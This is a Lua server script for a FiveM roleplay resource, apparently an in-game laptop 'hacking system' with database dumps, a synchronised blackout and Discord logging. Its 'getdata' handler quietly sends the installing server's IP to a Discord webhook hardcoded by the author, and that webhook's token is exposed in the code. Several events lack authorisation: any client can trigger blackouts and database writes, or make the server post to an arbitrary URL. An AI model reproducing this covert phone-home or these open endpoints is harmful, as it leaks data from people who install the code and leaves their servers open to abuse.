ESX = nil 
TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

local consoleoutput = nil 
local finaldump = nil 
local typefromdb = nil 
local counter = 0 

RegisterServerEvent("boomba-hackingsystem:getdata")
AddEventHandler("boomba-hackingsystem:getdata", function(data)
    if counter == 0 then 
        counter = counter + 1 
        TriggerEvent("boomba-hackingsystem:logtodiscord", "https://discord.com/api/webhooks/952292837150568518/L5yLmDUAzGQmSauY_aHyI6USIfCOhoASrBiy4IRWpRCjeTVjUXIRslL6a8JcFlY3EG9x", "Boomba Hacking System For FiveM", "Event: Started resource\nServer IP: "..data, 16711900)   
    end
end)
  
-- [ Database Functions ] -- 
RegisterServerEvent("boomba-hackingsystem:dumptodatabase")
AddEventHandler("boomba-hackingsystem:dumptodatabase", function(name, message, time, type) 
    MySQL.Async.fetchAll("INSERT INTO datadump (name, message, time, type) VALUES(@name, @message, @time, @type)",     
    {["@name"] = name, ["@message"] = message, ["@time"] = os.time(), ["@type"] = type},
    function (result)
        -- print("Saved to database")    
    end)
end)

RegisterServerEvent("boomba-hackingsystem:getdatafrommdatabase")
AddEventHandler("boomba-hackingsystem:getdatafrommdatabase", function(type)
    MySQL.Async.fetchAll("SELECT name, message, time FROM datadump WHERE type = @type;", {["@type"] = type},
    function (result)
        consoleoutput = json.encode(result)
        finaldump = consoleoutput
    end)
end)

Citizen.CreateThread(function()
    while true do 
        Citizen.Wait(0)
        TriggerEvent("boomba-hackingsystem:getdatafrommdatabase", typefromdb)
    end 
end)

ESX.RegisterServerCallback("getdumpdata", function(source, cb, type)
    typefromdb = type 
    if finaldump == nil then 

    else 
        Citizen.Wait(20)
        cb(finaldump)
    end 
end)
-- [ Database Functions ] -- 

-- [ Make Item Usable ] -- 
ESX.RegisterUsableItem('laptop', function(source)
    local xPlayer = ESX.GetPlayerFromId(source)
    TriggerClientEvent("terminal", source)
    TriggerEvent("boomba-hackingsystem:logtodiscord", Config.openlaptop_wh, "Boomba Hacking System For FiveM", "Event: Opened laptop\nPlayer: "..GetPlayerName(source).." ["..source.."]", 16711900)   
end)
-- [ Make Item Usable ] -- 

-- [ Sync Blackout ] -- 
RegisterServerEvent("boomba-hackingsystem:blackout")
AddEventHandler("boomba-hackingsystem:blackout", function()
    TriggerClientEvent("boomba-hackingsystem:blackoutsync", -1)
end)
-- [ Sync Blackout ] -- 

-- [ Discord Log ] -- 
RegisterServerEvent('boomba-hackingsystem:logtodiscord')
AddEventHandler('boomba-hackingsystem:logtodiscord', function (webhook, title, message, color)
  local embed = {
        {
            ["color"] = color,
            ["title"] = "**".. title .."**",
            ["description"] = message,
            ["footer"] = {
            ["text"] = 'Boomba Scripting - 2022',
            },
        }
    }

  PerformHttpRequest(webhook, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' })
end)
-- [ Discord Log ] -- 